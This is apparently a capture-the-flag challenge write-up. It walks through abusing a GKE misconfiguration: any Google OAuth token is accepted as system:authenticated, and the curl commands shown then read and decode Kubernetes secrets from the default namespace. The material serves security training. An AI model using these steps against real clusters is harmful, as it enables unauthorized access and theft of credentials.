### Challenge 1: Confidential Cluster

You received just an IP address as your very first entrypoint into the GCP project.  
The IP belongs to a Google Kubernetes Cluster (GKE) - how can you access the Kubernetes API to learn more about the cluster?

To simplify your next commands, set the IP address as an environment variable:  
#####
    export IP=<IP>

You can access the API of the cluster at this endpoint:  
#####
    curl -k https://$IP/api

As you are not authenticated, you are part of the group `system:anonymous` and you can't access much.  
Most endpoints will respond with 403 permission denied.  

But what if you were in `system:authenticated`? 
Try to get a token for your own Google account using the OAuth playground (select scope "Kubernetes Engine API v1").  

Set your token as environment variable to make the next commands easier to use.  
#####
    export TOKEN=<token>

Send a request with your token to the Kubernetes API:  
#####
    curl -k -H "Authorization:Bearer $TOKEN" https://$IP/api/

Just by supplying any Google access token you will be able to access the endpoint!  

Once you have obtained access and can read from the Kubernetes API - what API resources can you query?

You can find out which permissions 'system:authenticated' has on this cluster with a request to this endpoint:  
#####
    curl -k -X POST -H "Content-Type: application/json" -d '{"apiVersion":"authorization.k8s.io/v1", "kind":"SelfSubjectRulesReview", "spec":{"namespace":"default"}}' -H "Authorization:Bearer $TOKEN" https://$IP/apis/authorization.k8s.io/v1/selfsubjectrulesreviews

It looks like you have read access to some resources on the default namespace of the cluster.  
You can also query them by using the Kubernetes API:  
#####
    curl -k -H "Authorization:Bearer <token>" https://<IP>/api/v1/namespaces/default/...

#### Useful commands and tools:

- `curl -k https://<IP>`
- `curl -k -H "Authorization:Bearer <token>" https://<IP>/api/v1/namespaces/default/...`
- [Google OAuth Playground](https://developers.google.com/oauthplayground/)
- Learn more about this misconfiguration [here](https://orca.security/resources/blog/sys-all-google-kubernetes-engine-risk)

#### Hints

<details>
  <summary>Hint 1</summary>

  You can read Kubernetes secrets in the default namespace on the cluster. Which secrets might it hold?  
  #####
      curl -k -H "Authorization:Bearer $TOKEN" https://$IP/api/v1/namespaces/default/secrets

</details>

<details>
  <summary>Hint 2</summary>

  The secret values are base64 encoded. Decode them to read the value:  
  #####
      echo -n <secret-value> | base64 -d  

</details>
